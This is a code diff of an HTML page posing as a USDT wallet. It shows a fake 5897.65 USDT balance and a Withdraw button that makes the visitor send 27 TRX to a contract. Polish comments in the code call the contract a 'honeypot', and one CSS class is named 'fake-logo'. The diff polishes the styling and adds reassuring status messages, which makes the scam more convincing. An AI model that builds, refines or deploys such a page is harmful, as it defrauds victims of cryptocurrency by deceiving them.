@@ -4,21 +4,63 @@
   <title>USDT Wallet</title>
   <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
   <style>
-    body { font-family: Arial; background: #111; color: #0f0; text-align: center; padding-top: 50px; }
-    .card { background: #222; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0 0 20px #0f0; }
-    button { padding: 10px 20px; font-size: 18px; margin-top: 20px; cursor: pointer; }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #0f0f0f;
+      color: #00ff99;
+      text-align: center;
+      padding-top: 60px;
+      margin: 0;
+    }
+    .card {
+      background: #1a1a1a;
+      padding: 40px;
+      border-radius: 16px;
+      display: inline-block;
+      box-shadow: 0 0 30px #00ff99;
+      transition: all 0.3s ease;
+    }
+    .card:hover {
+      transform: scale(1.02);
+    }
+    button {
+      padding: 12px 30px;
+      font-size: 18px;
+      margin-top: 25px;
+      background: #00ff99;
+      color: #000;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.2s ease;
+    }
+    button:hover {
+      background: #00e68a;
+    }
+    .status {
+      margin-top: 20px;
+      font-style: italic;
+      color: #ccc;
+    }
+    .fake-logo {
+      font-size: 24px;
+      font-weight: bold;
+      margin-bottom: 30px;
+      color: #00ffcc;
+    }
   </style>
 </head>
 <body>
   <div class="card">
+    <div class="fake-logo">USDT Wallet</div>
     <h1>Balance: <span id="balance">5897.65</span> USDT</h1>
     <button onclick="attemptWithdraw()">Withdraw</button>
-    <p id="status"></p>
+    <p class="status" id="status"></p>
   </div>
 
   <script>
-    const CONTRACT_ADDRESS = "TUXXXXXXXXXXXXXX..."; // ← wklej swój adres TRCHoneypot z Shasty
-    const CONTRACT_ABI = [ // minimalny ABI
+    const CONTRACT_ADDRESS = "TUXXXXXXXXXXXXXXXXXXXXXX"; // <-- wklej swój adres kontraktu honeypot
+    const CONTRACT_ABI = [
       {
         "inputs": [],
         "name": "attemptWithdraw",
@@ -40,11 +82,12 @@
     }
 
     async function attemptWithdraw() {
-      document.getElementById("status").innerText = "Processing withdrawal... You must have 27 TRX for gas";
+      document.getElementById("status").innerText = "\u23F3 Withdrawal request received. Waiting for 27 TRX confirmation...";
       try {
         await contract.attemptWithdraw().send({ callValue: 27000000 }); // 27 TRX
+        document.getElementById("status").innerText = "\u2705 Transaction sent. Awaiting confirmation...";
       } catch (e) {
-        document.getElementById("status").innerText = "Transaction failed or cancelled.";
+        document.getElementById("status").innerText = "\u274C Transaction failed or cancelled.";
       }
     }
 
